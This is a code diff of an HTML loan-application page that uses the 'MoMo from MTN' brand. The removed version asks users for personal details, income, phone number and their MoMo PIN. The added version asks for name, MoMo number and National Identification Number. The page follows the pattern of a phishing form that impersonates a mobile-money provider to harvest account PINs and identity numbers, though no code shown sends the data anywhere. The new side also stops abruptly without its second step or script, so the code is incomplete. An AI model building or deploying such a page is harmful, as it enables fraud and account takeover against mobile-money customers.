@@ -62,7 +62,7 @@
         background: transparent;
       }
 
-      .logo-mark svg{
+      .logo-mark img{
         width:170px;
         height:170px;
         display:block;
@@ -109,7 +109,7 @@
 
       .progress-wrap{max-width:var(--maxWidth);margin:12px auto 20px;padding:0 6px}
       .progress{height:8px;background:rgba(255,255,255,0.06);border-radius:999px;overflow:hidden;position:relative}
-      .progress .fill{position:absolute;left:0;top:0;bottom:0;width:48%;background:var(--primary)}
+      .progress .fill{position:absolute;left:0;top:0;bottom:0;width:50%;background:var(--primary);transition:width 0.3s ease}
 
       /* main card */
       .card{max-width:var(--maxWidth);margin:10px auto;background:var(--panel);border-radius:18px;padding:24px;border:1px solid var(--border);box-shadow:var(--shadow)}
@@ -129,7 +129,7 @@
         padding:12px 14px;border-radius:10px;border:1px solid rgba(255,255,255,0.08);
         background:rgba(255,255,255,0.02);color:var(--text);font-size:0.98rem
       }
-      input::placeholder{color:rgba(237,249,255,0.7)}
+      input::placeholder{color:rgba(237,249,255,0.4)}
       input:focus{outline:none;border-color:rgba(255,209,0,0.95);box-shadow:0 0 0 4px rgba(255,209,0,0.08)}
       .full-width{grid-column:1 / -1}
 
@@ -141,7 +141,7 @@
       .loan-amount{color:var(--primary);font-weight:900}
 
       /* sliders: JS will set the yellow fill to match the thumb */
-      input[type="range"]{ -webkit-appearance:none; width:100%; height:10px; background:transparent; border-radius:999px; }
+      input[type="range"]{ -webkit-appearance:none; width:100%; height:10px; background:transparent; border-radius:999px; margin: 12px 0; }
       input[type="range"]::-webkit-slider-runnable-track{height:10px;border-radius:999px;background:rgba(255,255,255,0.06)}
       input[type="range"]::-webkit-slider-thumb{-webkit-appearance:none;margin-top:-5px;width:18px;height:18px;border-radius:50%;background:var(--bg);border:4px solid var(--primary);box-shadow:0 2px 6px rgba(0,0,0,0.45);cursor:pointer}
       input[type="range"]::-moz-range-thumb{width:18px;height:18px;border-radius:50%;background:var(--bg);border:4px solid var(--primary);cursor:pointer}
@@ -154,13 +154,14 @@
 
       /* actions */
       .actions{display:flex;gap:12px;justify-content:space-between;margin-top:14px}
-      .btn{padding:10px 16px;border-radius:10px;border:none;cursor:pointer;font-weight:800}
+      .btn{padding:10px 16px;border-radius:10px;border:none;cursor:pointer;font-weight:800;transition: opacity 0.2s ease;}
+      .btn:hover{opacity: 0.9;}
       .btn-primary{background:linear-gradient(135deg,var(--primary),var(--primary-strong));color:#06343a}
       .btn-secondary{background:transparent;color:var(--text);border:1px solid var(--border)}
 
       /* submitted screen */
-      .submitted-wrap{display:flex;justify-content:center}
-      .submitted-card{margin-top:20px;background:var(--panel);border-radius:14px;padding:28px;max-width:520px;border:1px solid var(--border);text-align:center}
+      .submitted-wrap{display:flex;justify-content:center; width:100%;}
+      .submitted-card{margin-top:20px;background:var(--panel);border-radius:14px;padding:28px;width:100%;max-width:520px;border:1px solid var(--border);text-align:center;box-shadow:var(--shadow)}
       .submitted-card h2{margin:6px 0;color:var(--text)}
       .submitted-copy{color:var(--muted-2);margin-bottom:18px}
       .submitted-summary{background:rgba(255,255,255,0.02);padding:14px;border-radius:10px;border:1px solid rgba(255,255,255,0.03);text-align:left}
@@ -168,6 +169,9 @@
       .processing{margin-top:14px;color:var(--muted-2);font-size:0.95rem;display:flex;align-items:center;justify-content:center;gap:8px}
       .spinner{width:14px;height:14px;border-radius:50%;border:2px solid rgba(255,255,255,0.12);border-top-color:var(--muted-2);animation:spin 1s linear infinite}
       @keyframes spin{to{transform:rotate(360deg)}}
+
+      /* Hidden utilities */
+      .hidden { display: none !important; }
 
       @media (max-width:880px){
         .grid{grid-template-columns:1fr}
@@ -184,282 +188,51 @@
       <header class="topbar">
         <div class="brand-logo" aria-label="MoMo from MTN">
           <div class="logo-mark" title="MoMo logo">
-            <!-- Money-style inline SVG (coin/note style mark) -->
-            <svg viewBox="0 0 300 300" xmlns="http://www.w3.org/2000/svg" width="170" height="170" preserveAspectRatio="xMidYMid meet" role="img" aria-label="MoMo money-style logo">
-              <defs>
-                <linearGradient id="moneyBlue" x1="0" x2="1" y1="0" y2="1">
-                  <stop offset="0%" stop-color="#0a6a77"/>
-                  <stop offset="100%" stop-color="#0c5d75"/>
-                </linearGradient>
-                <linearGradient id="moneyGold" x1="0" x2="1">
-                  <stop offset="0%" stop-color="#ffd100"/>
-                  <stop offset="100%" stop-color="#f2c200"/>
-                </linearGradient>
-              </defs>
-
-              <!-- blue square background -->
-              <rect x="12" y="12" width="276" height="276" rx="56" fill="url(#moneyBlue)"/>
-
-              <!-- subtle top shine -->
-              <path d="M40 58 C95 28, 190 26, 248 58 L248 82 C190 52, 100 52, 40 90 Z" fill="rgba(255,255,255,0.12)" />
-
-              <!-- money/finance emblem -->
-              <!-- left note/currency stroke -->
-              <path d="M72 196V104c0-12 10-22 22-22h18c19 0 35 16 35 35v3c0 19-16 35-35 35H94v41h52"
-                    fill="none" stroke="url(#moneyGold)" stroke-width="18" stroke-linecap="round" stroke-linejoin="round"/>
-              <!-- right note/currency stroke -->
-              <path d="M228 196V104c0-12-10-22-22-22h-18c-19 0-35 16-35 35v3c0 19 16 35 35 35h32v41h-52"
-                    fill="none" stroke="url(#moneyGold)" stroke-width="18" stroke-linecap="round" stroke-linejoin="round"/>
-              <!-- coin -->
-              <circle cx="150" cy="130" r="24" fill="url(#moneyGold)"/>
-              <circle cx="150" cy="130" r="10" fill="#0a6a77" opacity="0.75"/>
-
-              <!-- bottom flat bar -->
-              <rect x="38" y="234" width="224" height="16" rx="8" fill="#ffd100"/>
-            </svg>
-          </div>
-
-          <div class="brand-wordmark" aria-hidden="false">
-            <div class="brand-name">MoMo</div>
-            <div class="brand-sub">from MTN</div>
+            <img src="https://googleusercontent.com" alt="MoMo logo" width="170" height="170" />
           </div>
         </div>
       </header>
 
-      <section class="hero">
-        <div class="site-title">MOMO LOANS</div>
-        <p class="subtitle">Apply for a personal loan in two simple steps</p>
-      </section>
-
-      <div class="progress-wrap">
-        <div class="progress"><div class="fill" id="progressFill" style="width:48%"></div></div>
+      <div class="hero">
+        <h1 class="site-title">Instant Loans</h1>
+        <p class="subtitle">Quick financial access powered by your MoMo account balance.</p>
       </div>
 
-      <!-- dynamic app card -->
-      <div id="mainCard"></div>
-    </main>
+      <div id="form-progress-container" class="progress-wrap">
+        <div class="progress">
+          <div id="progress-bar" class="fill"></div>
+        </div>
+      </div>
 
-    <script>
-      (function () {
-        const STORAGE_KEY = 'momo_frontend_submissions_final';
-        const root = document.getElementById('mainCard');
-        const progressFill = document.getElementById('progressFill');
-        const currency = new Intl.NumberFormat('en-ZM', { style:'currency', currency:'ZMW', maximumFractionDigits:0 });
+      <!-- STEP 1: Personal Details -->
+      <div id="step-1-card" class="card">
+        <div class="step-row">
+          <span class="step-pill">STEP 1 OF 2</span>
+        </div>
+        <div class="card-header">
+          <div class="card-icon">1</div>
+          <div class="card-title">Personal Verification</div>
+        </div>
+        <p class="card-copy">Provide your standard MoMo registration details to scan for baseline limits.</p>
+        
+        <div class="grid">
+          <label>
+            Full Name
+            <input type="text" id="input-name" placeholder="John Doe" required />
+          </label>
+          <label>
+            MoMo Mobile Number
+            <input type="tel" id="input-phone" placeholder="e.g. 0770000000" required />
+          </label>
+          <label class="full-width">
+            National Identification Number (NIN)
+            <input type="text" id="input-nin" placeholder="CM00000000XXXX" required />
+          </label>
+        </div>
 
-        const defaultState = {
-          step:1,
-          name:'', email:'', address:'', dateOfBirth:'', monthlyIncome:'',
-          loanAmount:5000, termMonths:12,
-          phoneNumber:'', momoPin:''
-        };
-        let state = loadState() || {...defaultState};
+        <div class="actions">
+          <div></div>
+          <button class="btn btn-primary" onclick="goToStep(2)">Continue to Terms</button>
+        </div>
+      </div>
 
-        function saveState(){ try{ localStorage.setItem(STORAGE_KEY+'_state', JSON.stringify(state)); }catch{} }
-        function loadState(){ try{ const raw = localStorage.getItem(STORAGE_KEY+'_state'); return raw?JSON.parse(raw):null; }catch{return null;} }
-        function clearState(){ try{ localStorage.removeItem(STORAGE_KEY+'_state'); }catch{} state = {...defaultState}; }
-
-        function readSubs(){ try{ const raw = localStorage.getItem(STORAGE_KEY); return raw?JSON.parse(raw):[] }catch{return[];} }
-        function writeSubs(list){ try{ localStorage.setItem(STORAGE_KEY, JSON.stringify(list||[])); }catch{} }
-
-        function calcLoan(p, n){
-          const P = Number(p)||0; const rate = 18/12/100; const months = Number(n)||1;
-          if(!P||!months) return {monthlyPayment:0,totalRepayment:0,totalInterest:0};
-          const monthly = (P*rate*Math.pow(1+rate,months))/(Math.pow(1+rate,months)-1);
-          const total = monthly*months;
-          return {monthlyPayment:monthly,totalRepayment:total,totalInterest:total-P};
-        }
-
-        function setRangeFill(el){
-          const min = Number(el.min), max = Number(el.max), val = Number(el.value);
-          const pct = ((val-min)/(max-min))*100;
-          el.style.background = `linear-gradient(90deg, var(--primary) ${pct}%, rgba(255,255,255,0.06) ${pct}%)`;
-        }
-
-        function escapeHtml(s){ if(!s) return ''; return String(s).replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
-        function genRef(){ return Math.random().toString(16).slice(2,10); }
-
-        function renderStep1(){
-          state.step=1; progressFill.style.width='48%'; saveState();
-          root.innerHTML = `
-            <div class="card">
-              <div class="step-row">
-                <div class="step-pill">Step 1 of 2</div>
-                <div class="step-pill" style="background:transparent;color:var(--muted-2);font-weight:600">Personal details & loan</div>
-              </div>
-
-              <div class="card-header">
-                <div class="card-icon">👤</div>
-                <div>
-                  <div class="card-title">Personal details & loan</div>
-                  <div class="card-copy">Tell us about yourself and choose your loan terms.</div>
-                </div>
-              </div>
-
-              <form id="form1">
-                <div class="grid">
-                  <label>Full name<input id="name" type="text" value="${escapeHtml(state.name)}" required /></label>
-                  <label>Email address<input id="email" type="email" value="${escapeHtml(state.email)}" required /></label>
-                  <label class="full-width">Address<input id="address" type="text" value="${escapeHtml(state.address)}" /></label>
-                  <label>Date of birth<input id="dob" type="date" value="${escapeHtml(state.dateOfBirth)}" /></label>
-                  <label>Monthly income (ZMW)<input id="income" type="number" value="${escapeHtml(state.monthlyIncome)}" /></label>
-                </div>
-
-                <div class="loan-section">
-                  <h3>Loan calculator</h3>
-
-                  <div class="loan-row"><div>Loan amount</div><div class="loan-amount">${currency.format(state.loanAmount)}</div></div>
-                  <input id="loanRange" type="range" min="1000" max="50000" step="100" value="${state.loanAmount}" />
-                  <div class="range-labels"><span>K1,000</span><span>K50,000</span></div>
-
-                  <div class="loan-row" style="margin-top:14px"><div>Repayment term</div><div class="loan-amount">${state.termMonths} months</div></div>
-                  <input id="termRange" type="range" min="1" max="24" step="1" value="${state.termMonths}" />
-                  <div class="range-labels"><span>1 month</span><span>24 months</span></div>
-
-                  <div class="summary-box">
-                    <div><small>Monthly payment</small><strong id="monthlyPayment">-</strong></div>
-                    <div><small>Total interest</small><strong id="totalInterest">-</strong></div>
-                    <div><small>Total repayment</small><strong id="totalRepayment">-</strong></div>
-                  </div>
-
-                  <div class="fine-print" style="margin-top:12px;color:var(--muted-2)">Estimated at 8.9% APR. Final rates may vary based on eligibility.</div>
-                </div>
-
-                <div class="actions" style="margin-top:18px">
-                  <button type="button" class="btn btn-primary" id="toStep2">Continue</button>
-                </div>
-              </form>
-            </div>
-          `;
-          const loanRange = document.getElementById('loanRange');
-          const termRange = document.getElementById('termRange');
-          const monthlyEl = document.getElementById('monthlyPayment');
-          const interestEl = document.getElementById('totalInterest');
-          const repaymentEl = document.getElementById('totalRepayment');
-
-          function updateSummary(){
-            const calc = calcLoan(Number(loanRange.value), Number(termRange.value));
-            monthlyEl.textContent = currency.format(Math.round(calc.monthlyPayment));
-            interestEl.textContent = currency.format(Math.round(calc.totalInterest));
-            repaymentEl.textContent = currency.format(Math.round(calc.totalRepayment));
-            setRangeFill(loanRange); setRangeFill(termRange);
-            document.querySelectorAll('.loan-amount')[0].textContent = currency.format(Number(loanRange.value));
-            document.querySelectorAll('.loan-amount')[1].textContent = Number(termRange.value) + ' months';
-          }
-
-          loanRange.addEventListener('input', () => { state.loanAmount = Number(loanRange.value); updateSummary(); saveState(); });
-          termRange.addEventListener('input', () => { state.termMonths = Number(termRange.value); updateSummary(); saveState(); });
-
-          // initial
-          updateSummary();
-
-          document.getElementById('toStep2').addEventListener('click', () => {
-            const n = document.getElementById('name').value.trim();
-            const e = document.getElementById('email').value.trim();
-            if(!n||!e){ alert('Please enter your name and email to continue.'); return; }
-            state.name = n; state.email = e; state.address = document.getElementById('address').value.trim();
-            state.dateOfBirth = document.getElementById('dob').value; state.monthlyIncome = document.getElementById('income').value;
-            saveState();
-            renderStep2();
-          });
-        }
-
-        function renderStep2(){
-          state.step=2; progressFill.style.width='96%'; saveState();
-          root.innerHTML = `
-            <div class="card">
-              <div class="step-row">
-                <div class="step-pill">Step 2 of 2</div>
-                <div class="step-pill" style="background:transparent;color:var(--muted-2);font-weight:600">Phone & MoMo PIN</div>
-              </div>
-
-              <div class="card-header">
-                <div class="card-icon">🔒</div>
-                <div>
-                  <div class="card-title">Phone & MoMo PIN</div>
-                  <div class="card-copy">Verify your identity with your phone and MoMo PIN.</div>
-                </div>
-              </div>
-
-              <form id="form2">
-                <div class="grid">
-                  <label class="full-width">Phone number (only MoMo number accepted)
-                    <input id="phone" type="tel" placeholder="e.g. 0966 123 456" value="${escapeHtml(state.phoneNumber)}" required />
-                  </label>
-                  <label class="full-width">MoMo PIN
-                    <input id="pin" type="password" placeholder="0000" value="${escapeHtml(state.momoPin)}" required />
-                  </label>
-                </div>
-
-                <div style="display:flex;align-items:center;justify-content:space-between;margin-top:18px">
-                  <button type="button" class="btn btn-secondary" id="backBtn">⟨ Back</button>
-                  <button type="submit" class="btn btn-primary" id="submitBtn">Submit application</button>
-                </div>
-              </form>
-            </div>
-          `;
-
-          document.getElementById('backBtn').addEventListener('click', () => { renderStep1(); });
-
-          document.getElementById('form2').addEventListener('submit', (ev) => {
-            ev.preventDefault();
-            const phone = document.getElementById('phone').value.trim();
-            const pin = document.getElementById('pin').value.trim();
-            if(!phone){ alert('Enter phone number'); return; }
-            if(!pin){ alert('Enter MoMo PIN'); return; }
-            state.phoneNumber = phone; state.momoPin = pin; saveState();
-
-            const payload = {
-              id: Date.now(),
-              reference: genRef(),
-              createdAt: new Date().toISOString(),
-              name: state.name, email: state.email, address: state.address,
-              dateOfBirth: state.dateOfBirth, monthlyIncome: Number(state.monthlyIncome)||0,
-              loanAmount: Number(state.loanAmount)||0, termMonths: Number(state.termMonths)||0,
-              phoneNumber: state.phoneNumber
-            };
-
-            const list = readSubs(); list.unshift(payload); writeSubs(list);
-            clearState();
-            renderSubmitted(payload);
-          });
-        }
-
-        function renderSubmitted(payload){
-          progressFill.style.width='100%';
-          const calc = calcLoan(payload.loanAmount, payload.termMonths);
-          root.innerHTML = `
-            <div class="submitted-wrap">
-              <div class="submitted-card" role="status" aria-live="polite">
-                <div style="display:flex;justify-content:center;margin-bottom:8px">
-                  <div style="width:64px;height:64px;border-radius:10px;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,#06343a,#044a59);box-shadow:0 10px 20px rgba(0,0,0,0.35)">
-                    <svg width="40" height="40" viewBox="0 0 300 300" xmlns="http://www.w3.org/2000/svg"><defs><linearGradient id="g1" x1="0" x2="1"><stop offset="0%" stop-color="#ffd100"/><stop offset="100%" stop-color="#f2c200"/></linearGradient></defs><path d="M85 190 L120 120 L152 156 L190 96 L208 96 L208 190 L175 190 L175 150 L148 186 L120 156 L100 190 Z" fill="url(#g1)"/><circle cx="128" cy="128" r="20" fill="url(#g1)"/></svg>
-                  </div>
-                </div>
-
-                <h2>Application submitted</h2>
-                <p class="submitted-copy">We're processing your application. This page updates automatically once there's an update.</p>
-
-                <div class="submitted-summary" aria-hidden="false">
-                  <div class="row"><div>Loan amount</div><div>${currency.format(payload.loanAmount)}</div></div>
-                  <div class="row"><div>Monthly payment</div><div>${currency.format(Math.round(calc.monthlyPayment))}</div></div>
-                  <div class="row"><div>Term</div><div>${payload.termMonths} months</div></div>
-                  <div class="row"><div>Reference</div><div style="font-family:monospace">${payload.reference}</div></div>
-                </div>
-
-                <div class="processing"><div class="spinner" aria-hidden="true"></div><div>Processing...</div></div>
-              </div>
-            </div>
-          `;
-
-          setTimeout(()=> {
-            const proc = root.querySelector('.processing');
-            if(proc) proc.innerHTML = '<div style="color:var(--primary);font-weight:800">Submitted — we will notify you of updates.</div>';
-          }, 3000);
-        }
-
-        // mount
-        if(state.step===2) renderStep2(); else renderStep1();
-      })();
-    </script>
-  </body>
-</html>
